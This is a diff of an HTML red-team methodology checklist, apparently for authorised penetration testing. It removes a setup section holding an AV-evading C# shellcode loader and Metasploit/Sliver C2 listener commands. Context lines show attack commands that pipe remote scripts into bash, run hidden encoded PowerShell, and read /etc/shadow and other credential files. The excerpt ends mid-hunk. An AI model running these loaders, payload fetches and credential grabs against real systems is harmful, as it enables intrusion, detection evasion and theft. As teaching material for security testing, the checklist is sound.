@@ -10302,133 +10302,9 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
 <h2 id="methodology">11. Methodology</h2>
 <p>Operator-checklist methodology. Each phase walks the engagement end-to-end: pick the primitive, validate the precondition, run the command, verify the outcome, document, move on.</p>
 
-<h3 id="methodology-tools-setup">11.1 Tools & Setup</h3>
-<p>Build the lab, the toolchain, and the payload-build pipeline before any engagement traffic flows.</p>
-<h4 id="methodology-tools-setup-lab">11.1.1 Lab Environment</h4>
-  <ul>
-    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0"> Stand up an attacker VM with the engagement&rsquo;s toolchain:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-0"> Kali / Parrot or hardened Debian</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-1"> Sliver / Mythic / Metasploit installed and validated</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-2"> C# build chain: <code>dotnet</code> + Visual Studio Build Tools</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-0-3"> PowerShell with v2 fallback for legacy targets</li>
-      </ul>
-    </li>
-    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1"> Stage a clean Windows VM for payload testing:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-0"> Match the target OS build where possible</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-1"> Install the target AV/EDR if obtainable (Defender at minimum)</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-1-2"> Snapshot before each detonation test</li>
-      </ul>
-    </li>
-    <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2"> Set up a payload-staging web server with TLS:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-0"> <code>python3 -m http.server 80</code> for ad-hoc</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-1"> nginx with redirector config for engagement traffic</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-lab-wf-2-2"> Let&rsquo;s Encrypt cert for the C2 domain</li>
-      </ul>
-    </li>
-  </ul>
-<pre><code class="language-bash"># Validate toolchain on attacker VM
-msfconsole --version
-sliver-server version
-dotnet --list-sdks
-pwsh -v
-
-# Snapshot the test VM before each detonation
-VBoxManage snapshot "Win10-Target" take "clean-baseline"</code></pre>
-
-<h4 id="methodology-tools-setup-shellcode-loader">11.1.2 Shellcode Loader Skeleton</h4>
-  <ul>
-    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0"> Pick a loader language that fits the target&rsquo;s execution policy:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-0"> C# when .NET 4.x is present and CLM is off</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-1"> C/C++ when AppLocker DLL rules permit</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-2"> PowerShell when CLM is off</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-0-3"> VBA when Office macros are allowed</li>
-      </ul>
-    </li>
-    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1"> Avoid the obvious load-time signatures:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-0"> No <code>VirtualAlloc + RWX</code> single-call pattern</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-1"> No <code>CreateThread</code> immediately after copying shellcode</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-1-2"> No hard-coded shellcode in <code>.data</code></li>
-      </ul>
-    </li>
-    <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2"> Test before delivery:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2-0"> Run against Defender with cloud-protection on</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-shellcode-loader-wf-2-1"> Run against an unhooked process tree to see if hooks are flagging</li>
-      </ul>
-    </li>
-  </ul>
-<pre><code class="language-csharp">// Minimal C# shellcode loader skeleton (OSEP baseline)
-using System;
-using System.Runtime.InteropServices;
-
-class Loader {
-    [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(IntPtr addr, uint sz,
-        uint type, uint protect);
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr attr, uint stk,
-        IntPtr start, IntPtr param, uint flags, IntPtr tid);
-    [DllImport("kernel32.dll")]
-    static extern uint WaitForSingleObject(IntPtr h, uint ms);
-
-    static void Main() {
-        // XOR-decrypt shellcode at runtime — never store raw
-        byte[] enc = new byte[] { /* encrypted shellcode */ };
-        byte[] buf = Decrypt(enc, 0xFA);
-
-        // Allocate RW, copy, then flip to RX (two-step)
-        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length,
-            0x3000, 0x04);            // MEM_COMMIT|RESERVE, PAGE_READWRITE
-        Marshal.Copy(buf, 0, addr, buf.Length);
-        VirtualProtect(addr, (uint)buf.Length, 0x20, out _); // PAGE_EXECUTE_READ
-
-        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
-            IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(hThread, 0xFFFFFFFF);
-    }
-
-    static byte[] Decrypt(byte[] data, byte key) {
-        byte[] result = new byte[data.Length];
-        for (int i = 0; i &lt; data.Length; i++)
-            result[i] = (byte)(data[i] ^ key);
-        return result;
-    }
-}</code></pre>
-
-<h4 id="methodology-tools-setup-listener">11.1.3 Payload Delivery & Listener</h4>
-  <ul>
-    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-0"> Stand up listener and validate end-to-end:</li>
-  </ul>
-<pre><code class="language-bash"># Metasploit multi/handler
-msfconsole -q -x "use exploit/multi/handler; \
-  set payload windows/x64/meterpreter/reverse_https; \
-  set LHOST [ip]; set LPORT 443; \
-  set ExitOnSession false; exploit -j"</code></pre>
-<pre><code class="language-bash"># Sliver HTTPS listener
-sliver-server
-https -l 443 -d [c2-domain]
-generate --http https://[c2-domain] --save ./implants/</code></pre>
-  <ul>
-    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-0-1"> Verify TLS handshake works through the redirector before sending payloads</li>
-    <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1"> Plan a fallback channel before delivery:
-      <ul>
-        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-0"> Different protocol (HTTPS &rarr; DNS, mTLS &rarr; HTTP)</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-1"> Different TLD on different infra</li>
-        <li><input type="checkbox" data-id="methodology-tools-setup-listener-wf-1-2"> Documented in your handoff notes</li>
-      </ul>
-    </li>
-  </ul>
-
-<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a></p>
-
-<h3 id="methodology-reconnaissance">11.2 Reconnaissance</h3>
+<h3 id="methodology-reconnaissance">11.1 Reconnaissance</h3>
 <p>Map the surface before you touch it. Scan &rarr; enumerate &rarr; research &rarr; attack &mdash; exhaust each stage before advancing.</p>
-<h4 id="methodology-reconnaissance-external-scan">11.2.1 External Scanning</h4>
+<h4 id="methodology-reconnaissance-external-scan">11.1.1 External Scanning</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-reconnaissance-external-scan-wf-0"> Discover hosts and the full port surface:</li>
   </ul>
@@ -10457,7 +10333,7 @@ rustscan -a [ip] --greppable 2&gt;/dev/null \
   </ul>
 <p><strong>References:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></p>
 
-<h4 id="methodology-reconnaissance-internal-scan">11.2.2 Internal Scanning From the Foothold</h4>
+<h4 id="methodology-reconnaissance-internal-scan">11.1.2 Internal Scanning From the Foothold</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-reconnaissance-internal-scan-wf-0"> Pick the right scanner for the foothold&rsquo;s posture:
       <ul>
@@ -10478,9 +10354,9 @@ rustscan -a [ip] --greppable 2&gt;/dev/null \
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://wadcoms.github.io/" target="_blank" rel="noopener noreferrer">WADComs</a></p>
 
-<h3 id="methodology-initial-access">11.3 Initial Access</h3>
+<h3 id="methodology-initial-access">11.2 Initial Access</h3>
 <p>Land code execution with the least-noisy delivery the engagement allows.</p>
-<h4 id="methodology-initial-access-phishing">11.3.1 Phishing</h4>
+<h4 id="methodology-initial-access-phishing">11.2.1 Phishing</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-phishing-wf-0"> Pick the delivery container that survives the mail gateway:
       <ul>
@@ -10564,7 +10440,7 @@ self.close
 &lt;/html&gt;</code></pre>
 <p><strong>References:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
 
-<h4 id="methodology-initial-access-payloads">11.3.2 Payloads</h4>
+<h4 id="methodology-initial-access-payloads">11.2.2 Payloads</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-payloads-wf-0"> C# loader checklist:</li>
   </ul>
@@ -10605,7 +10481,7 @@ powershell -nop -w hidden -enc $b64</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-initial-access-shell-upgrade">11.3.3 Upgrading Shells</h4>
+<h4 id="methodology-initial-access-shell-upgrade">11.2.3 Upgrading Shells</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-shell-upgrade-wf-0"> Upgrade reverse shell to a fully interactive PTY (Linux):
       <ul>
@@ -10643,7 +10519,7 @@ C:\Windows\Temp\svc.exe
 # Option 3: Meterpreter session upgrade (from within msfconsole)
 sessions -u [session-id]</code></pre>
 
-<h4 id="methodology-initial-access-process-injection">11.3.4 Process Injection & Migration</h4>
+<h4 id="methodology-initial-access-process-injection">11.2.4 Process Injection & Migration</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-process-injection-wf-0"> Pick a target process appropriate for the payload:
       <ul>
@@ -10812,9 +10688,9 @@ ResumeThread(hThread);</code></pre>
 
 <p><strong>General references:</strong> <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a> &middot; <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
 
-<h3 id="methodology-tunneling">11.4 Tunneling</h3>
+<h3 id="methodology-tunneling">11.3 Tunneling</h3>
 <p>Pivot through the foothold into restricted subnets without breaking ops.</p>
-<h4 id="methodology-tunneling-ligolo">11.4.1 Ligolo-ng</h4>
+<h4 id="methodology-tunneling-ligolo">11.3.1 Ligolo-ng</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-tunneling-ligolo-wf-0"> Set up the proxy server side:</li>
   </ul>
@@ -10842,7 +10718,7 @@ curl https://[internal-host]</code></pre>
   <ul>
   </ul>
 
-<h4 id="methodology-tunneling-sshuttle">11.4.2 sshuttle</h4>
+<h4 id="methodology-tunneling-sshuttle">11.3.2 sshuttle</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-tunneling-sshuttle-wf-0"> When the foothold is Linux with SSH key access:
       <ul>
@@ -10853,7 +10729,7 @@ curl https://[internal-host]</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-tunneling-metasploit-pivot">11.4.3 Metasploit Pivoting</h4>
+<h4 id="methodology-tunneling-metasploit-pivot">11.3.3 Metasploit Pivoting</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-tunneling-metasploit-pivot-wf-0"> Set up a route through a Meterpreter session:</li>
   </ul>
@@ -10872,7 +10748,7 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
   <ul>
   </ul>
 
-<h4 id="methodology-tunneling-domain-fronting">11.4.4 Domain Fronting</h4>
+<h4 id="methodology-tunneling-domain-fronting">11.3.4 Domain Fronting</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-tunneling-domain-fronting-wf-0"> Confirm a CDN that still permits SNI/Host mismatch:
       <ul>
@@ -10882,7 +10758,7 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-tunneling-dns-tunneling">11.4.5 DNS Tunneling</h4>
+<h4 id="methodology-tunneling-dns-tunneling">11.3.5 DNS Tunneling</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-tunneling-dns-tunneling-wf-0"> When egress is locked to DNS only:
       <ul>
@@ -10895,9 +10771,9 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding" target="_blank" rel="noopener noreferrer">HackTricks Tunneling</a> &middot; <a href="https://attack.mitre.org/techniques/T1090/" target="_blank" rel="noopener noreferrer">MITRE T1090 Proxy</a></p>
 
-<h3 id="methodology-windows-postex">11.5 Windows Post Exploitation</h3>
+<h3 id="methodology-windows-postex">11.4 Windows Post Exploitation</h3>
 <p>Situational awareness &rarr; escalate &rarr; evade &rarr; loot. Cycle until the host yields what the engagement needs.</p>
-<h4 id="methodology-windows-postex-sit-aware">11.5.1 Situational Awareness</h4>
+<h4 id="methodology-windows-postex-sit-aware">11.4.1 Situational Awareness</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-windows-postex-sit-aware-wf-0"> Identity and integrity:
       <ul>
@@ -10930,7 +10806,7 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
   </ul>
 <p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
 
-<h4 id="methodology-windows-postex-privesc">11.5.2 Privilege Escalation</h4>
+<h4 id="methodology-windows-postex-privesc">11.4.2 Privilege Escalation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-windows-postex-privesc-wf-0"> Triage with an automated check first:
       <ul>
@@ -11007,7 +10883,7 @@ proxychains4 -q nmap -sT -Pn -p- [internal-ip]</code></pre>
 
 <p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://attack.mitre.org/techniques/T1068/" target="_blank" rel="noopener noreferrer">MITRE T1068 PrivEsc Vuln</a></p>
 
-<h4 id="methodology-windows-postex-defense-evasion">11.5.3 Defense Evasion</h4>
+<h4 id="methodology-windows-postex-defense-evasion">11.4.3 Defense Evasion</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-windows-postex-defense-evasion-wf-0"> AMSI before any in-process .NET / PowerShell load:
       <ul>
@@ -11127,7 +11003,7 @@ powershell -version 2 -c "IEX(...)"</code></pre>
 </table>
 <p><strong>References:</strong> <a href="https://attack.mitre.org/techniques/T1027/" target="_blank" rel="noopener noreferrer">MITRE T1027 Obfuscation</a></p>
 
-<h4 id="methodology-windows-postex-credential-access">11.5.4 Credential Access</h4>
+<h4 id="methodology-windows-postex-credential-access">11.4.4 Credential Access</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-windows-postex-credential-access-wf-0"> LSASS dump &mdash; only when authorised, prefer reflective approaches:
       <ul>
@@ -11192,9 +11068,9 @@ SharpDPAPI.exe machinetriage</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Win Local</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
 
-<h3 id="methodology-linux-postex">11.6 Linux Post Exploitation</h3>
+<h3 id="methodology-linux-postex">11.5 Linux Post Exploitation</h3>
 <p>Triage &rarr; look for misconfigs first &rarr; escalate &rarr; pivot. Save kernel exploits for last.</p>
-<h4 id="methodology-linux-postex-triage">11.6.1 Host Triage</h4>
+<h4 id="methodology-linux-postex-triage">11.5.1 Host Triage</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-linux-postex-triage-wf-0"> Identity and privilege:
       <ul>
@@ -11234,7 +11110,7 @@ curl -L http://[ip]/linpeas.sh | bash
 base64 -w0 linpeas.sh | xclip -sel c   # on attacker
 echo "[paste]" | base64 -d | bash       # on target</code></pre>
 
-<h4 id="methodology-linux-postex-privesc">11.6.2 Privilege Escalation</h4>
+<h4 id="methodology-linux-postex-privesc">11.5.2 Privilege Escalation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-linux-postex-privesc-wf-0"> Look at sudo first:
       <ul>
@@ -11300,7 +11176,7 @@ gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
 # 3. Place in the search path and trigger</code></pre>
 <p><strong>References:</strong> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc</a> &middot; <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></p>
 
-<h4 id="methodology-linux-postex-lateral">11.6.3 Lateral Movement</h4>
+<h4 id="methodology-linux-postex-lateral">11.5.3 Lateral Movement</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-linux-postex-lateral-wf-0"> Re-use SSH keys:
       <ul>
@@ -11335,7 +11211,7 @@ grep -rli "password\|passwd\|secret\|key\|token" /opt/ /var/ /etc/ /home/ 2&gt;/
 cat /var/www/html/wp-config.php 2&gt;/dev/null | grep DB_
 cat /etc/shadow   # if readable — crack with hashcat -m 1800</code></pre>
 
-<h4 id="methodology-linux-postex-shared-lib">11.6.4 Shared Library Hijacking</h4>
+<h4 id="methodology-linux-postex-shared-lib">11.5.4 Shared Library Hijacking</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-linux-postex-shared-lib-wf-0"> Identify writable directories in the linker&rsquo;s search path:
       <ul>
@@ -11379,7 +11255,7 @@ done
 gcc -shared -fPIC -o /tmp/pe.so pe.c -nostartfiles
 sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
 
-<h4 id="methodology-linux-postex-defense-evasion">11.6.5 Defense Evasion</h4>
+<h4 id="methodology-linux-postex-defense-evasion">11.5.5 Defense Evasion</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-linux-postex-defense-evasion-wf-0"> Avoid bash history:
       <ul>
@@ -11399,9 +11275,9 @@ sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener noreferrer">HackTricks Linux PrivEsc</a> &middot; <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a></p>
 
-<h3 id="methodology-mssql">11.7 MSSQL</h3>
+<h3 id="methodology-mssql">11.6 MSSQL</h3>
 <p>Authenticate, enumerate, then weaponise. Always look for relay and linked-server pivots before noisy primitives.</p>
-<h4 id="methodology-mssql-auth">11.7.1 Authentication</h4>
+<h4 id="methodology-mssql-auth">11.6.1 Authentication</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-auth-wf-0"> Pick a credential source:
       <ul>
@@ -11420,7 +11296,7 @@ sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-mssql-enumeration">11.7.2 Enumeration</h4>
+<h4 id="methodology-mssql-enumeration">11.6.2 Enumeration</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-enumeration-wf-0"> Server-level info:
       <ul>
@@ -11444,7 +11320,7 @@ sudo LD_PRELOAD=/tmp/pe.so [allowed-command]</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-mssql-code-exec">11.7.3 Code Execution Primitives</h4>
+<h4 id="methodology-mssql-code-exec">11.6.3 Code Execution Primitives</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-code-exec-wf-0"> xp_cmdshell route:</li>
   </ul>
@@ -11471,7 +11347,7 @@ EXEC xp_cmdshell 'powershell -enc [base64-payload]'</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-mssql-linked-server">11.7.4 Linked Server Pivot</h4>
+<h4 id="methodology-mssql-linked-server">11.6.4 Linked Server Pivot</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-0"> Enumerate linked servers and reachable databases:
       <ul>
@@ -11491,7 +11367,7 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
     <li><input type="checkbox" data-id="methodology-mssql-linked-server-wf-2"> Chain across multiple links if needed</li>
   </ul>
 
-<h4 id="methodology-mssql-relay">11.7.5 NTLM Relay Attacks</h4>
+<h4 id="methodology-mssql-relay">11.6.5 NTLM Relay Attacks</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-relay-wf-0"> Set up the relay listener:
       <ul>
@@ -11507,7 +11383,7 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-mssql-privesc">11.7.6 Privilege Escalation</h4>
+<h4 id="methodology-mssql-privesc">11.6.6 Privilege Escalation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-0"> Impersonate sysadmin via <code>EXECUTE AS</code></li>
     <li><input type="checkbox" data-id="methodology-mssql-privesc-wf-1"> Trustworthy database escalation:
@@ -11525,9 +11401,9 @@ EXEC ('xp_cmdshell ''whoami''') AT [linked]</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" target="_blank" rel="noopener noreferrer">HackTricks MSSQL</a></p>
 
-<h3 id="methodology-ad-enumeration">11.8 Active Directory Enumeration</h3>
+<h3 id="methodology-ad-enumeration">11.7 Active Directory Enumeration</h3>
 <p>Collect a full view of the domain before touching anything. Plan attack paths before staging.</p>
-<h4 id="methodology-ad-enumeration-bloodhound">11.8.1 BloodHound &amp; SharpHound</h4>
+<h4 id="methodology-ad-enumeration-bloodhound">11.7.1 BloodHound &amp; SharpHound</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-wf-0"> Collect from the foothold with the right scope:</li>
   </ul>
@@ -11550,7 +11426,7 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
   </ul>
 <p><strong>References:</strong> <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a></p>
 
-<h4 id="methodology-ad-enumeration-ldap">11.8.2 Direct LDAP Queries</h4>
+<h4 id="methodology-ad-enumeration-ldap">11.7.2 Direct LDAP Queries</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-ldap-wf-0"> Quick enumeration via netexec:
       <ul>
@@ -11571,7 +11447,7 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-ad-enumeration-powerview">11.8.3 PowerView</h4>
+<h4 id="methodology-ad-enumeration-powerview">11.7.3 PowerView</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-powerview-wf-0"> Domain map:
       <ul>
@@ -11596,7 +11472,7 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-ad-enumeration-acl-enum">11.8.4 ACL Enumeration</h4>
+<h4 id="methodology-ad-enumeration-acl-enum">11.7.4 ACL Enumeration</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-acl-enum-wf-0"> Generic-All / Generic-Write / WriteDACL / WriteOwner:
       <ul>
@@ -11612,7 +11488,7 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-ad-enumeration-netexec">11.8.5 NetExec / CrackMapExec Sweeps</h4>
+<h4 id="methodology-ad-enumeration-netexec">11.7.5 NetExec / CrackMapExec Sweeps</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-netexec-wf-0"> Spray validated credentials across the domain:
       <ul>
@@ -11634,7 +11510,7 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
     </li>
   </ul>
 
-<h4 id="methodology-ad-enumeration-bloodhound-cypher">11.8.6 Cypher Queries</h4>
+<h4 id="methodology-ad-enumeration-bloodhound-cypher">11.7.6 Cypher Queries</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-enumeration-bloodhound-cypher-wf-0"> Useful saved queries:
       <ul>
@@ -11648,9 +11524,9 @@ bloodhound-python -u [user] -p [pass] -d [domain] -dc [dc] -c All</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a> &middot; <a href="https://adsecurity.org/" target="_blank" rel="noopener noreferrer">AD Security</a></p>
 
-<h3 id="methodology-ad-exploitation">11.9 Active Directory Exploitation</h3>
+<h3 id="methodology-ad-exploitation">11.8 Active Directory Exploitation</h3>
 <p>Pick the right primitive for the captured context. Stage credentials, tickets, certificates safely; validate dominance is reproducible.</p>
-<h4 id="methodology-ad-exploitation-kerberoast-asrep">11.9.1 Kerberoasting &amp; AS-REP Roasting</h4>
+<h4 id="methodology-ad-exploitation-kerberoast-asrep">11.8.1 Kerberoasting &amp; AS-REP Roasting</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-0"> Roast every SPN-holding user:
       <ul>
@@ -11675,7 +11551,7 @@ hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
   <ul>
   </ul>
 
-<h4 id="methodology-ad-exploitation-unconstrained">11.9.2 Unconstrained Delegation</h4>
+<h4 id="methodology-ad-exploitation-unconstrained">11.8.2 Unconstrained Delegation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-0"> Find unconstrained-delegation hosts:
       <ul>
@@ -11692,7 +11568,7 @@ hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
     <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-2"> Extract the TGT and use it for DCSync</li>
   </ul>
 
-<h4 id="methodology-ad-exploitation-constrained">11.9.3 Constrained Delegation</h4>
+<h4 id="methodology-ad-exploitation-constrained">11.8.3 Constrained Delegation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-0"> Find principals trusted for delegation to specific SPNs:
       <ul>
@@ -11708,7 +11584,7 @@ hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
     </li>
   </ul>
 
-<h4 id="methodology-ad-exploitation-rbcd">11.9.4 Resource-Based Constrained Delegation</h4>
+<h4 id="methodology-ad-exploitation-rbcd">11.8.4 Resource-Based Constrained Delegation</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-rbcd-wf-0"> Full RBCD chain (3 steps):</li>
   </ul>
@@ -11730,7 +11606,7 @@ impacket-psexec -k -no-pass [target]</code></pre>
   <ul>
   </ul>
 
-<h4 id="methodology-ad-exploitation-shadow-creds">11.9.5 Shadow Credentials</h4>
+<h4 id="methodology-ad-exploitation-shadow-creds">11.8.5 Shadow Credentials</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-shadow-creds-wf-0"> Write msDS-KeyCredentialLink on the target:
       <ul>
@@ -11740,7 +11616,7 @@ impacket-psexec -k -no-pass [target]</code></pre>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-shadow-creds-wf-1"> Authenticate via PKINIT and recover the NT hash</li>
   </ul>
 
-<h4 id="methodology-ad-exploitation-adcs">11.9.6 AD Certificate Services (ESC1&ndash;ESC16)</h4>
+<h4 id="methodology-ad-exploitation-adcs">11.8.6 AD Certificate Services (ESC1&ndash;ESC16)</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-0"> Map the ADCS posture:
       <ul>
@@ -11774,7 +11650,7 @@ impacket-psexec -hashes :[nt-hash] [domain]/Administrator@[dc]</code></pre>
   <ul>
   </ul>
 
-<h4 id="methodology-ad-exploitation-acl-abuse">11.9.7 ACL Abuse</h4>
+<h4 id="methodology-ad-exploitation-acl-abuse">11.8.7 ACL Abuse</h4>
   <ul>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-0"> Generic-Write &rarr; targeted Kerberoast:
       <ul>
@@ -11790,7 +11666,7 @@ impacket-psexec -hashes :[nt-hash] [domain]/Administrator@[dc]</code></pre>
     <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-3"> AddMember chains via nested groups</li>
   </ul>
 
-<h4 id="methodology-ad-exploitation-ticket-forgery">11.9.8 Ticket Forgery</h4>
